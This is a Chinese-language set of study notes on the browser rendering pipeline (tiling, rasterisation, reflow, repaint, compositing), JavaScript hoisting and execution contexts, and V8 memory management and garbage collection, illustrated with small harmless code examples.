<h3 id="图层绘制"><a href="#图层绘制" class="headerlink" title="图层绘制"></a>图层绘制</h3><p>完成图层树的构建之后，渲染引擎会对图层树中的每个图层进行绘制。渲染引擎会把一个图层的绘制拆分成很多小的<strong>绘制指令</strong>，然后再把这些指令按照顺序组成一个待绘制列表。绘制列表中的指令非常简单，因此绘制一个元素通常需要好几条绘制指令，因为每个元素的背景、前景、边框都需要单独的指令去绘制。</p>
<h3 id="栅格化（raster）操作"><a href="#栅格化（raster）操作" class="headerlink" title="栅格化（raster）操作"></a>栅格化（raster）操作</h3><p>绘制列表只是用来记录绘制顺序和绘制指令的列表，而实际上绘制操作是由渲染引擎中的合成线程来完成的。可以结合下图来看下渲染主线程和合成线程之间的关系：</p>
<p><img src="https://i.loli.net/2021/06/13/CebMaRv9WpDYjxg.jpg" alt="Snipaste_2021-06-13_21-01-32.jpg"></p>
<p>当图层的绘制列表准备好之后，主线程会把该绘制列表<strong>提交</strong>给合成线程。通常一个页面可能很大，但是用户只能看到其中的一部分，我们把用户可以看到的这个部分叫做<strong>视口</strong></p>
<p>在有些情况下，有的图层可以很大，比如有的页面你使用滚动条要滚动好久才能滚动到底部，但是通过视口，用户只能看到页面的很小一部分，所以在这种情况下，要绘制出所有图层内容的话，就会产生太大的开销，而且也没有必要。</p>
<p>基于这个原因，<strong>合成线程会将图层划分为图块（tile）</strong>，这些图块的大小通常是 256x256 或者 512x512，如下图所示：</p>
<p><img src="https://i.loli.net/2021/06/13/6y39hZ8vjKBFrVS.jpg" alt="Snipaste_2021-06-13_21-02-44.jpg"></p>
<p>然后<strong>合成线程会按照视口附近的图块来优先生成位图，实际生成位图的操作是由栅格化来执行的。所谓栅格化，是指将图块转换为位图</strong>。而图块是栅格化执行的最小单位。渲染进程维护了一个栅格化的线程池，所有的图块栅格化都是在线程池内执行的，运行方式如下图所示：</p>
<p><img src="https://i.loli.net/2021/06/13/F7UPtWLOjM4eQzI.jpg" alt="Snipaste_2021-06-13_21-08-02.jpg"></p>
<p>通常，栅格化过程都会使用 GPU 来加速生成，使用 GPU 生成位图的过程叫快速栅格化，或者 GPU 栅格化，生成的位图被保存在 GPU 内存中。</p>
<h3 id="合成和显示"><a href="#合成和显示" class="headerlink" title="合成和显示"></a>合成和显示</h3><p>一旦所有图块都被光栅化，合成线程就会生成一个绘制图块的命令——“DrawQuad”，然后将该命令提交给浏览器进程。</p>
<p>浏览器进程里面有一个叫 viz 的组件，用来接收合成线程发过来的 DrawQuad 命令，然后根据 DrawQuad 命令，将其页面内容绘制到内存中，最后再将内存显示在屏幕上。</p>
<h3 id="渲染流水线大总结"><a href="#渲染流水线大总结" class="headerlink" title="渲染流水线大总结"></a>渲染流水线大总结</h3><p><img src="https://i.loli.net/2021/06/13/f4ZzuGRy2SKVqbN.jpg" alt="Snipaste_2021-06-13_21-09-36.jpg"></p>
<p>结合上图，一个完整的渲染流程大致可总结为如下：</p>
<ol>
<li>渲染进程将 HTML 内容转换为能够读懂的<strong>DOM 树</strong>结构。</li>
<li>渲染引擎将 CSS 样式表转化为浏览器可以理解的<strong>styleSheets</strong>，计算出 DOM 节点的样式。</li>
<li>创建<strong>布局树</strong>，并计算元素的布局信息。</li>
<li>对布局树进行分层，并生成<strong>分层树</strong>。</li>
<li>为每个图层生成<strong>绘制列表</strong>，并将其提交到合成线程。</li>
<li>合成线程将图层分成<strong>图块</strong>，并在<strong>光栅化线程池</strong>中将图块转换成位图。</li>
<li>合成线程发送绘制图块命令<strong>DrawQuad</strong>给浏览器进程。</li>
<li>浏览器进程根据 DrawQuad 消息<strong>生成页面</strong>，并<strong>显示</strong>到显示器上。</li>
</ol>
<h3 id="1-概念——重排（更新了元素的几何属性）"><a href="#1-概念——重排（更新了元素的几何属性）" class="headerlink" title="1. 概念——重排（更新了元素的几何属性）"></a>1. 概念——重排（更新了元素的几何属性）</h3><p><img src="https://i.loli.net/2021/06/13/Ni7Q8rkXM1P6sLb.jpg" alt="Snipaste_2021-06-13_21-10-59.jpg"></p>
<p>如果通过 JavaScript 或者 CSS 修改元素的几何位置属性，例如改变元素的宽度、高度等，那么浏览器会触发重新布局，解析之后的一系列子阶段，这个过程就叫<strong>重排</strong>。无疑，<strong>重排需要更新完整的渲染流水线，所以开销也是最大的</strong>。</p>
<h3 id="2-概念——重绘（更新元素的绘制属性）"><a href="#2-概念——重绘（更新元素的绘制属性）" class="headerlink" title="2. 概念——重绘（更新元素的绘制属性）"></a>2. 概念——重绘（更新元素的绘制属性）</h3><p><img src="https://i.loli.net/2021/06/13/Xd5g8YJPq3iVwv2.jpg" alt="Snipaste_2021-06-13_21-12-08.jpg"></p>
<p>从图中可以看出，如果修改了元素的背景颜色，那么布局阶段将不会被执行，因为并没有引起几何位置的变换，所以就直接进入了绘制阶段，然后执行之后的一系列子阶段，这个过程就叫<strong>重绘</strong>。相较于重排操作，<strong>重绘省去了布局和分层阶段，所以执行效率会比重排操作要高一些</strong>。</p>
<h3 id="3-概念——合成"><a href="#3-概念——合成" class="headerlink" title="3. 概念——合成"></a>3. 概念——合成</h3><p>如果更改一个既不要布局也不要绘制的属性，渲染引擎将跳过布局和绘制，只执行后续的合成操作，我们把这个过程叫做<strong>合成</strong>。</p>
<p><img src="https://i.loli.net/2021/06/13/riV1bC6JFjwvLZK.jpg" alt="Snipaste_2021-06-13_21-13-06.jpg"></p>
<p>使用 CSS 的 transform 来实现动画效果，这可以避开重排和重绘阶段，直接在非主线程上执行合成动画操作。这样的效率是最高的，因为是在非主线程上合成，并没有占用主线程的资源，另外也避开了布局和绘制两个子阶段，所以<strong>相对于重绘和重排，合成能大大提升绘制效率</strong>。</p>
<hr>
<h1 id="浏览器中的JavaScript执行机制"><a href="#浏览器中的JavaScript执行机制" class="headerlink" title="浏览器中的JavaScript执行机制"></a>浏览器中的JavaScript执行机制</h1><h2 id="执行上下文"><a href="#执行上下文" class="headerlink" title="执行上下文"></a><strong>执行上下文</strong></h2><ol>
<li>在执行过程中，若使用了未声明的变量，那么 JavaScript 执行会报错。</li>
<li>在一个变量定义之前使用它，不会出错，但是该变量的值会为 undefined，而不是定义时的值。</li>
<li>在一个函数定义之前使用它，不会出错，且函数能正确执行。</li>
</ol>
<h2 id="变量提升（Hoisting）"><a href="#变量提升（Hoisting）" class="headerlink" title="变量提升（Hoisting）"></a>变量提升（Hoisting）</h2><p><img src="https://i.loli.net/2021/06/13/gQsNIO3vzcDpZSq.jpg" alt="Snipaste_2021-06-13_21-35-36.jpg"></p>
<p>上面是<strong>变量</strong>的声明和赋值，下面是<strong>函数</strong>的声明和赋值</p>
<p><img src="https://i.loli.net/2021/06/13/TBXObM38ZhgsrlV.jpg" alt="Snipaste_2021-06-13_21-36-23.jpg"></p>
<p>所谓的<strong>变量提升</strong>，是指在 JavaScript 代码执行过程中，JavaScript 引擎把变量的声明部分和函数的声明部分提升到代码开头的“行为”。变量被提升后，会给变量设置默认值，这个默认值就是我们熟悉的 undefined。</p>
<h2 id="JavaScript-代码的执行流程"><a href="#JavaScript-代码的执行流程" class="headerlink" title="JavaScript 代码的执行流程"></a>JavaScript 代码的执行流程</h2><p>从概念的字面意义上来看，“变量提升”意味着变量和函数的声明会在物理层面移动到代码的最前面。但<strong>实际上变量和函数声明在代码里的位置是不会改变的，而是在编译阶段被 JavaScript 引擎放入内存中</strong>。一段 JavaScript 代码在执行之前需要被 JavaScript 引擎编译，<strong>编译</strong>完成之后，才会进入<strong>执行</strong>阶段。</p>
<p><img src="https://i.loli.net/2021/06/13/tGEw7LNHFIBqYcb.jpg" alt="Snipaste_2021-06-13_21-38-29.jpg"></p>
<h3 id="1-编译阶段"><a href="#1-编译阶段" class="headerlink" title="1. 编译阶段"></a><strong>1. 编译阶段</strong></h3><p><img src="https://i.loli.net/2021/06/13/bIClNV2394fLiXB.jpg" alt="Snipaste_2021-06-13_21-39-32.jpg"></p>
<p>输入一段代码，经过编译后，会生成两部分内容：<strong>执行上下文（Execution context）和可执行代码</strong>。</p>
<p><strong>执行上下文是 JavaScript 执行一段代码时的运行环境</strong>，比如调用一个函数，就会进入这个函数的执行上下文，确定该函数在执行期间用到的诸如 this、变量、对象以及函数等。</p>
<h3 id="2-执行阶段"><a href="#2-执行阶段" class="headerlink" title="2. 执行阶段"></a><strong>2. 执行阶段</strong></h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">showName()</span><br><span class="line"><span class="built_in">console</span>.log(myname)</span><br><span class="line"><span class="keyword">var</span> myname = <span class="string">&#x27;极客时间&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showName</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;函数 showName 被执行&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>当执行到 showName 函数时，JavaScript 引擎便开始在变量环境对象中查找该函数，由于变量环境对象中存在该函数的引用，所以 JavaScript 引擎便开始执行该函数，并输出“函数 showName 被执行”结果。</p>
</li>
<li><p>接下来打印“myname”信息，JavaScript 引擎继续在变量环境对象中查找该对象，由于变量环境存在 myname 变量，并且其值为 undefined，所以这时候就输出 undefined。</p>
</li>
<li><p>接下来执行第 3 行，把“极客时间”赋给 myname 变量，赋值后变量环境中的 myname 属性值改变为“极客时间”，变量环境如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VariableEnvironment:</span><br><span class="line">     myname -&gt; &quot; 极客时间 &quot;, </span><br><span class="line">     showName -&gt;function : &#123;console.log(myname)</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="代码中出现相同的变量或者函数怎么办？"><a href="#代码中出现相同的变量或者函数怎么办？" class="headerlink" title="代码中出现相同的变量或者函数怎么办？"></a>代码中出现相同的变量或者函数怎么办？</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showName</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;极客邦&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">showName();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showName</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;极客时间&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">showName(); </span><br></pre></td></tr></table></figure>

<ul>
<li><strong>首先是编译阶段</strong>。遇到了第一个 showName 函数，会将该函数体存放到变量环境中。接下来是第二个 showName 函数，继续存放至变量环境中，但是变量环境中已经存在一个 showName 函数了，此时，<strong>第二个 showName 函数会将第一个 showName 函数覆盖掉</strong>。这样变量环境中就只存在第二个 showName 函数了。</li>
<li><strong>接下来是执行阶段</strong>。先执行第一个 showName 函数，但由于是从变量环境中查找 showName 函数，而变量环境中只保存了第二个 showName 函数，所以最终调用的是第二个函数，打印的内容是“极客时间”。第二次执行 showName 函数也是走同样的流程，所以输出的结果也是“极客时间”。</li>
</ul>
<p>综上，<strong>一段代码如果定义了两个相同名字的函数，那么最终生效的是最后一个函数</strong>。</p>
<h2 id="为什么JavaScript代码会出现栈溢出？"><a href="#为什么JavaScript代码会出现栈溢出？" class="headerlink" title="为什么JavaScript代码会出现栈溢出？"></a>为什么JavaScript代码会出现栈溢出？</h2><p>**明确:**哪些情况下代码才算是“一段”代码，才会在执行之前就进行编译并创建执行上下文。一般说来，有这么三种情况：</p>
<ol>
<li>当 JavaScript 执行全局代码的时候，会编译全局代码并创建全局执行上下文，而且在整个页面的生存周期内，全局执行上下文只有一份。</li>
<li>当调用一个函数的时候，函数体内的代码会被编译，并创建函数执行上下文，一般情况下，函数执行结束之后，创建的函数执行上下文会被销毁。</li>
<li>当使用 eval 函数的时候，eval 的代码也会被编译，并创建执行上下文。</li>
</ol>
<p>JavaScript 中有很多函数，经常会出现在一个函数中调用另外一个函数的情况，<strong>调用栈就是用来管理函数调用关系的一种数据结构</strong>。</p>
<h3 id="什么是函数调用"><a href="#什么是函数调用" class="headerlink" title="什么是函数调用"></a>什么是函数调用</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">2</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> b = <span class="number">10</span></span><br><span class="line"><span class="keyword">return</span>  a+b</span><br><span class="line">&#125;</span><br><span class="line">add()</span><br></pre></td></tr></table></figure>

<p>决定暂时不整理这一块的笔记，主要还是浏览器的知识吧。（因为感觉像把老师说的都复制了一边= ）</p>
<hr>
<h1 id="V8工作原理"><a href="#V8工作原理" class="headerlink" title="V8工作原理"></a>V8工作原理</h1><p>这里主要介绍<strong>JavaScript 的内存机制。</strong></p>
<h2 id="数据在内存中的存放"><a href="#数据在内存中的存放" class="headerlink" title="数据在内存中的存放"></a>数据在内存中的存放</h2><h3 id="JavaScript-的语言类型"><a href="#JavaScript-的语言类型" class="headerlink" title="JavaScript 的语言类型"></a>JavaScript 的语言类型</h3><p>JavaScript 是<strong>动态语言</strong>，因为在声明变量之前并不需要确认其数据类型；也是<strong>弱类型语言</strong>，因为它支持隐式类型转换。<strong>（动态弱类型）</strong></p>
<h3 id="JavaScript-的数据类型"><a href="#JavaScript-的数据类型" class="headerlink" title="JavaScript 的数据类型"></a>JavaScript 的数据类型</h3><p>JavaScript 中的数据类型一种有 8 种，它们分别是：</p>
<p><img src="https://i.loli.net/2021/06/14/Lx2RKzPS3FybiaH.jpg" alt="Snipaste_2021-06-14_15-44-28.jpg"></p>
<p>有三点需要注意：</p>
<p>第一点，使用 typeof 检测 Null 类型时，返回的是 Object。这是当初 JavaScript 语言的一个 Bug，一直保留至今，之所以一直没修改过来，主要是为了兼容老的代码。</p>
<p>第二点，Object 类型比较特殊，它是由上述 7 种类型组成的一个包含了 key-value 对的数据类型。如下所示：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> myObj = &#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&#x27;极客时间&#x27;</span>,</span><br><span class="line">    <span class="attr">update</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;....&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中 vaule 可以是任何类型，包括函数，这也就意味着可以通过 Object 来存储函数，Object 中的函数又称为方法</p>
<p>第三点，我们把前面的 7 种数据类型称为<strong>原始类型</strong>，把最后一个对象类型称为<strong>引用类型</strong></p>
<h3 id="内存空间"><a href="#内存空间" class="headerlink" title="内存空间"></a>内存空间</h3><p><img src="https://i.loli.net/2021/06/14/cUdWrQKFxCw6jn7.jpg" alt="Snipaste_2021-06-14_15-46-52.jpg"></p>
<p>在 JavaScript 的执行过程中， 主要有三种类型内存空间，分别是<strong>代码空间、栈空间</strong>和<strong>堆空间</strong>。</p>
<p>参考如下代码段：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="string">&quot; 极客时间 &quot;</span></span><br><span class="line">    <span class="keyword">var</span> b = a</span><br><span class="line">    <span class="keyword">var</span> c = &#123;<span class="attr">name</span>:<span class="string">&quot; 极客时间 &quot;</span>&#125;</span><br><span class="line">    <span class="keyword">var</span> d = c</span><br><span class="line">&#125;</span><br><span class="line">foo()</span><br></pre></td></tr></table></figure>

<p>当执行一段代码时，需要先编译，并创建执行上下文，然后再按照顺序执行代码。当执行到第 3 行时，变量 a 和变量 b 的值都被保存在执行上下文中，而执行上下文又被压入到栈中，所以也可以认为变量 a 和变量 b 的值都是存放在栈中的。执行第 4 行代码，由于 JavaScript 引擎判断右边的值是一个引用类型，这时候JavaScript 引擎会将它分配到堆空间里面，分配后该对象会有一个在“堆”中的地址，然后再将该数据的地址写进 c 的变量值，最终分配好内存的示意图如下所示：</p>
<p><img src="https://i.loli.net/2021/06/14/k3yoZitJHrPqD45.jpg" alt="Snipaste_2021-06-14_15-52-29.jpg"></p>
<p>因此，<strong>对象类型</strong>是存放在<strong>堆空间</strong>的，在栈空间中只是保留了<strong>对象的引用地址</strong>，当 JavaScript 需要访问该数据的时候，通过栈中的引用地址来访问。即：<strong>原始类型的数据值都是直接保存在“栈”中的，引用类型的值是存放在“堆”中的。</strong></p>
<blockquote>
<p>为什么一定要分“堆”和“栈”两个存储空间？</p>
</blockquote>
<p>因为 JavaScript 引擎需要用栈来维护程序执行期间上下文的状态，如果栈空间大了话，所有的数据都存放在栈空间里面，那么会影响到上下文切换的效率，进而又影响到整个程序的执行效率。比如文中的 foo 函数执行结束了，JavaScript 引擎需要离开当前的执行上下文，只需要将指针下移到上个执行上下文的地址就可以了，foo 函数执行上下文栈区空间全部回收，具体过程可以参考下图：</p>
<p><img src="https://i.loli.net/2021/06/14/gfdXi2vJHput3xo.jpg" alt="Snipaste_2021-06-14_15-54-55.jpg"></p>
<p><strong>通常情况下，栈空间都不会设置太大，主要用来存放一些原始类型的小数据</strong>。而引用类型的数据占用的空间都比较大，所以这一类数据会被存放到堆中，<strong>堆空间很大，能存放很多大的数据</strong>，不过缺点是分配内存和回收内存都会占用一定的时间。</p>
<p>在 JavaScript 中，赋值操作和其他语言有很大的不同，<strong>原始类型的赋值会完整复制变量值，而引用类型的赋值是复制引用地址</strong>。所以<code>d=c</code>的操作就是把 c 的引用地址赋值给 d。</p>
<h2 id="JavaScript-处理垃圾回收"><a href="#JavaScript-处理垃圾回收" class="headerlink" title="JavaScript 处理垃圾回收"></a>JavaScript 处理垃圾回收</h2><p>通常情况下，垃圾数据回收分为<strong>手动回收</strong>和<strong>自动回收</strong>两种策略。在JavaScript中 <strong>产生的垃圾数据是由垃圾回收器来释放的。</strong></p>
<h3 id="调用栈中的数据是如何回收的"><a href="#调用栈中的数据是如何回收的" class="headerlink" title="调用栈中的数据是如何回收的"></a>调用栈中的数据是如何回收的</h3><p>首先是调用栈中的数据，还是通过一段示例代码的执行流程来分析其回收机制，具体如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">1</span></span><br><span class="line">    <span class="keyword">var</span> b = &#123;<span class="attr">name</span>:<span class="string">&quot; 极客邦 &quot;</span>&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">showName</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">var</span> c = <span class="string">&quot; 极客时间 &quot;</span></span><br><span class="line">      <span class="keyword">var</span> d = &#123;<span class="attr">name</span>:<span class="string">&quot; 极客时间 &quot;</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    showName()</span><br><span class="line">&#125;</span><br><span class="line">foo()</span><br></pre></td></tr></table></figure>

<p>当执行到第 6 行代码时，其调用栈和堆空间状态图如下所示：</p>
<p><img src="https://i.loli.net/2021/06/14/D9F3peN68g5PG7C.jpg" alt="Snipaste_2021-06-14_15-58-51.jpg"></p>
<p>如果执行到 showName 函数时，那么 JavaScript 引擎会创建 showName 函数的执行上下文，并将 showName 函数的执行上下文压入到调用栈中，最终执行到 showName 函数时，其调用栈就如上图所示。与此同时，还有一个<strong>记录当前执行状态的指针（称为 ESP）</strong>，指向调用栈中 showName 函数的执行上下文，表示当前正在执行 showName 函数。</p>
<p>接着，当 showName 函数执行完成之后，函数执行流程就进入了 foo 函数，那这时就需要销毁 showName 函数的执行上下文。JavaScript 会将 ESP 下移到 foo 函数的执行上下文，<strong>这个下移操作就是销毁 showName 函数执行上下文的过程</strong>。</p>
<p><img src="https://i.loli.net/2021/06/14/QAW1ZmTXOSxEvMc.jpg" alt="Snipaste_2021-06-14_16-01-56.jpg"></p>
<p>从图中可以看出，当 showName 函数执行结束之后，ESP 向下移动到 foo 函数的执行上下文中，上面 showName 的执行上下文虽然保存在栈内存中，但是已经是无效内存了。比如当 foo 函数再次调用另外一个函数时，这块内容会被直接覆盖掉，用来存放另外一个函数的执行上下文。</p>
<h3 id="堆中的数据是如何回收的"><a href="#堆中的数据是如何回收的" class="headerlink" title="堆中的数据是如何回收的"></a>堆中的数据是如何回收的</h3><p>当上面那段代码的 foo 函数执行结束之后，ESP 指向全局执行上下文。不过保存在堆中的两个对象依然占用着空间，如下图所示：</p>
<p><img src="https://i.loli.net/2021/06/14/l4CMFg9DnWY6Vv3.jpg" alt="Snipaste_2021-06-14_16-03-41.jpg"></p>
<p><strong>要回收堆中的垃圾数据，就需要用到 JavaScript 中的垃圾回收器了</strong>。</p>
<h4 id="代际假说和分代收集"><a href="#代际假说和分代收集" class="headerlink" title="代际假说和分代收集"></a>代际假说和分代收集</h4><p><strong>代际假说</strong>有以下两个特点：</p>
<ul>
<li>第一个是大部分对象在内存中存在的时间很短，简单来说，就是很多对象一经分配内存，很快就变得不可访问；</li>
<li>第二个是不死的对象，会活得更久。</li>
</ul>
<p>在 V8 中会把堆分为<strong>新生代</strong>和<strong>老生代</strong>两个区域，<strong>新生代中存放的是生存时间短的对象，老生代中存放的生存时间久的对象</strong>。新生区通常只支持 1～8M 的容量，而老生区支持的容量就大很多了。对于这两块区域，V8 分别使用两个不同的垃圾回收器，以便更高效地实施垃圾回收。</p>
<ul>
<li><strong>副垃圾回收器，主要负责新生代的垃圾回收。</strong></li>
<li><strong>主垃圾回收器，主要负责老生代的垃圾回收。</strong></li>
</ul>
<h4 id="垃圾回收器的工作流程"><a href="#垃圾回收器的工作流程" class="headerlink" title="垃圾回收器的工作流程"></a>垃圾回收器的工作流程</h4><p><strong>不论什么类型的垃圾回收器，它们都有一套共同的执行流程</strong>。</p>
<p>第一步是标记空间中活动对象和非活动对象。所谓活动对象就是还在使用的对象，非活动对象就是可以进行垃圾回收的对象。</p>
<p>第二步是回收非活动对象所占据的内存。其实就是在所有的标记完成之后，统一清理内存中所有被标记为可回收的对象。</p>
<p>第三步是做内存整理。一般来说，频繁回收对象后，内存中就会存在大量不连续空间，我们把这些不连续的内存空间称为<strong>内存碎片</strong>。当内存中出现了大量的内存碎片之后，如果需要分配较大连续内存的时候，就有可能出现内存不足的情况。</p>
<h4 id="副垃圾回收器"><a href="#副垃圾回收器" class="headerlink" title="副垃圾回收器"></a>副垃圾回收器</h4><p>通常情况下，大多数小的对象都会被分配到新生区，所以说这个区域虽然不大，但是垃圾回收还是比较频繁的。</p>
<p><img src="https://i.loli.net/2021/06/14/sYxBfKQ2dlXUOvD.jpg" alt="Snipaste_2021-06-14_16-08-17.jpg"></p>
<p>新生代中用<strong>Scavenge 算法</strong>来处理。所谓 Scavenge 算法，是把新生代空间对半划分为两个区域，一半是对象区域，一半是空闲区域。</p>
<p>新加入的对象都会存放到对象区域，当对象区域快被写满时，就需要执行一次垃圾清理操作。</p>
<p>在垃圾回收过程中，首先要对对象区域中的垃圾做标记；标记完成之后，就进入垃圾清理阶段，副垃圾回收器会把这些存活的对象复制到空闲区域中，同时它还会把这些对象有序地排列起来，所以这个复制过程，也就相当于完成了内存整理操作，复制后空闲区域就没有内存碎片了。</p>
<p>完成复制后，对象区域与空闲区域进行角色翻转，也就是原来的对象区域变成空闲区域，原来的空闲区域变成了对象区域。这样就完成了垃圾对象的回收操作，同时这种<strong>角色翻转的操作还能让新生代中的这两块区域无限重复使用下去</strong>。</p>
<p>由于新生代中采用的 Scavenge 算法，所以每次执行清理操作时，都需要将存活的对象从对象区域复制到空闲区域。但复制操作需要时间成本，如果新生区空间设置得太大了，那么每次清理的时间就会过久，所以<strong>为了执行效率，一般新生区的空间会被设置得比较小</strong>。</p>
<p>也正是因为新生区的空间不大，所以很容易被存活的对象装满整个区域。为了解决这个问题，JavaScript 引擎采用了<strong>对象晋升策略</strong>，也就是经过两次垃圾回收依然还存活的对象，会被移动到老生区中。</p>
<h4 id="主垃圾回收器"><a href="#主垃圾回收器" class="headerlink" title="主垃圾回收器"></a>主垃圾回收器</h4><p>一些大的对象会直接被分配到老生区。因此老生区中的对象有两个特点，一个是对象占用空间大，另一个是对象存活时间长。</p>
<p>主垃圾回收器是采用<strong>标记 - 清除（Mark-Sweep）</strong>的算法进行垃圾回收。首先是标记过程阶段。标记阶段就是从一组根元素开始，递归遍历这组根元素，在这个遍历过程中，能到达的元素称为<strong>活动对象</strong>，没有到达的元素就可以判断为<strong>垃圾数据</strong>。</p>
<p>接下来就是垃圾的清除过程。它和副垃圾回收器的垃圾清除过程完全不同，可以理解这个过程是清除掉红色标记数据的过程，可参考下图大致理解下其清除过程：</p>
<p><img src="https://i.loli.net/2021/06/14/5HYsMJtWfvkRIw2.jpg" alt="Snipaste_2021-06-14_16-10-01.jpg"></p>
<p>不过对一块内存多次执行标记 - 清除算法后，会产生大量不连续的内存碎片。而碎片过多会导致大对象无法分配到足够的连续内存，于是又产生了另外一种算法——<strong>标记 - 整理（Mark-Compact）</strong>，这个标记过程仍然与标记 - 清除算法里的是一样的，但后续步骤不是直接对可回收对象进行清理，而是让所有存活的对象都向一端移动，然后直接清理掉端边界以外的内存。可以参考下图：</p>
<p><img src="https://i.loli.net/2021/06/14/AJstiWxBMYI6pof.jpg" alt="Snipaste_2021-06-14_16-10-53.jpg"></p>
<h4 id="全停顿"><a href="#全停顿" class="headerlink" title="全停顿"></a>全停顿</h4><p>一旦执行垃圾回收算法，都需要将正在执行的 JavaScript 脚本暂停下来，待垃圾回收完毕后再恢复脚本执行。我们把这种行为叫做<strong>全停顿（Stop-The-World）</strong>。</p>
<p>在 V8 新生代的垃圾回收中，因其空间较小，且存活对象较少，所以全停顿的影响不大，但老生代就不一样。为了降低老生代的垃圾回收而造成的卡顿，V8 将标记过程分为一个个的子标记过程，同时让垃圾回收标记和 JavaScript 应用逻辑交替进行，直到标记阶段完成，我们把这个算法称为<strong>增量标记（Incremental Marking）算法</strong>。如下图所示：</p>
<p><img src="https://i.loli.net/2021/06/14/yo1ZYa8LJWk95ze.jpg" alt="Snipaste_2021-06-14_16-12-19.jpg"></p>
<p>使用增量标记算法，可以把一个完整的垃圾回收任务拆分为很多小的任务，这些小的任务执行时间比较短，可以穿插在其他的 JavaScript 任务中间执行。</p>
<h2 id="V8-执行代码"><a href="#V8-执行代码" class="headerlink" title="V8 执行代码"></a>V8 执行代码</h2><h3 id="编译器和解释器"><a href="#编译器和解释器" class="headerlink" title="编译器和解释器"></a>编译器和解释器</h3><p><strong>编译型语言</strong>在程序执行之前，需要经过<strong>编译器</strong>的编译过程，并且编译之后会直接保留机器能读懂的二进制文件，这样每次运行程序时，都可以直接运行该二进制文件，而不需要再次重新编译了。比如 C/C++、GO 等都是编译型语言。</p>
<p>而由<strong>解释型语言</strong>编写的程序，在每次运行时都需要通过<strong>解释器</strong>对程序进行动态解释和执行。比如 Python、JavaScript 等都属于解释型语言。</p>
<p><img src="https://i.loli.net/2021/06/14/moU4e59sAfbJ3O7.jpg" alt="Snipaste_2021-06-14_16-14-19.jpg"></p>
<ul>
<li>在编译型语言的编译过程中，编译器首先会依次对源代码进行词法分析、语法分析，生成抽象语法树（AST），然后是优化代码，最后再生成处理器能够理解的机器码。如果编译成功，将会生成一个可执行的文件。但如果编译过程发生了语法或者其他的错误，那么编译器就会抛出异常，最后的二进制文件也不会生成成功。</li>
<li>在解释型语言的解释过程中，同样解释器也会对源代码进行词法分析、语法分析，并生成抽象语法树（AST），不过它会再基于抽象语法树生成字节码，最后再根据字节码来执行程序、输出结果。</li>
</ul>
<h3 id="V8-是如何执行一段-JavaScript-代码的"><a href="#V8-是如何执行一段-JavaScript-代码的" class="headerlink" title="V8 是如何执行一段 JavaScript 代码的"></a>V8 是如何执行一段 JavaScript 代码的</h3><p><img src="https://i.loli.net/2021/06/14/q7Y9LpBNKa3ADGh.jpg" alt="Snipaste_2021-06-14_16-15-31.jpg"></p>
<p>V8 在执行过程中既有<strong>解释器 Ignition</strong>，又有<strong>编译器 TurboFan</strong></p>
<h4 id="1-生成抽象语法树（AST）和执行上下文"><a href="#1-生成抽象语法树（AST）和执行上下文" class="headerlink" title="1. 生成抽象语法树（AST）和执行上下文"></a>1. 生成抽象语法树（AST）和执行上下文</h4><p>AST 是非常重要的一种数据结构，在很多项目中有着广泛的应用。其中最著名的一个项目是 Babel。Babel 的工作原理就是先将 ES6 源码转换为 AST，然后再将 ES6 语法的 AST 转换为 ES5 语法的 AST，最后利用 ES5 的 AST 生成 JavaScript 源代码。</p>
<p>除了 Babel 外，还有 ESLint 也使用 AST。ESLint 是一个用来检查 JavaScript 编写规范的插件，其检测流程也是需要将源码转换为 AST，然后再利用 AST 来检查代码规范化的问题。</p>
<p>通常，生成 AST 需要经过两个阶段。</p>
<p><strong>第一阶段是分词（tokenize），又称为词法分析</strong>，其作用是将一行行的源码拆解成一个个 token。所谓<strong>token</strong>，指的是语法上不可能再分的、最小的单个字符或字符串。</p>
<p><img src="https://i.loli.net/2021/06/14/vgzrFh48SEIMRoi.jpg" alt="Snipaste_2021-06-14_16-17-33.jpg"></p>
<p>其中关键字“var”、标识符“myName” 、赋值运算符“=”、字符串“极客时间”四个都是 token。</p>
<p><strong>第二阶段是解析（parse），又称为语法分析</strong>，其作用是将上一步生成的 token 数据，根据语法规则转为 AST。如果源码符合语法规则，这一步就会顺利完成。但如果源码存在语法错误，这一步就会终止，并抛出一个“语法错误”。</p>
